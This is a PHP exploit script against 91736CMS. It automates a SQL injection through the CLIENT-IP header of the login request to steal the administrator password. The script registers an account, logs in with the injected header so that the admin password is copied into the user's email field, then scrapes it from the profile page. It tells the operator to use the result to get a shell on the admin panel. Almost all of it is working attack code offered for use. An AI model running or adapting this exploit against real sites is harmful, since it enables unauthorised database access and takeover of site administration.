<?php
print_r('
+---------------------------------------------------------------------------+
91736CMS Getip() Remote SQL Injection Exploit
by CodePlay Team (Yaseng && Desperado)
if  expoit  success  you can  see  get  admin  pass 
+---------------------------------------------------------------------------+
');
if ($argc < 4)
{
print_r('
+---------------------------------------------------------------------------+
Example:
php '.$argv[0].' localhost name   pass
+---------------------------------------------------------------------------+
');
exit;
}
error_reporting(3);
ini_set('max_execution_time', 0);
$host = $argv[1];
$username = $argv[2];
$password = $argv[3];
 
 
 
 //注册用户 
 
 
	$styleUrl=$host."/index.php?m=member&f=register_save";

	$styleData="username={$username}&password={$password}&password2={$password}&fields%5Btruename%5D={$username}&fields%5Bemail%5D={$username}&submit=+%D7%A2+%B2%E1+";



	$ch = curl_init($styleUrl);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $styleData);
	curl_setopt($ch, CURLOPT_POST, 1);
	$token=curl_exec($ch);
	
	
  
	
	
	curl_close($ch);
 
 
 
 
 
 $cookie_file	=	tempnam('./temp','cookie');
 
 
$site = $host;
$post_fields	=	"username={$username}&password={$password}&button=+%B5%C7%C2%BC+";   //登陆数据包
$login_url=$site."/index.php?m=member&f=login_save";
$cookie_file	=	tempnam('./temp','cookie');
$ch = curl_init($login_url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER , array('X-FORWARDED-FOR:fuck', "CLIENT-IP:fuck  by  C.P.T',`email`=(SELECT password FROM `c_admin` ),`logins`=4 WHERE `username`='$username'#") );  //构造IP
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
 curl_exec($ch);



curl_close($ch);

 
	$styleUrl=$host."/index.php?m=member&f=edit";

	$styleData="";
 

	$ch = curl_init($styleUrl);
	curl_setopt($ch, CURLOPT_HEADER, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $styleData);
	curl_setopt($ch, CURLOPT_POST, 1);
	$data=curl_exec($ch);
	  
 
	
	curl_close($ch);
	
	
	   
    $regex="/id=\"email\"(.*)<\/td>/i";
   

    preg_match($regex,$data,$result);
    
    
   
    
    
    
    
    $regex="/value=\"(.*)\"/";
    
    
    if(preg_match($regex,$result[0],$pass)){
    	
      
      echo   "shit pass:".$pass[1]." and  login  the   admin   Panel  to  getShell";    	
    	
    	
    }
    else{
    	
    	
    	echo  "fuck !!!    you  are  field  ";
    	
    } 
      
 

?>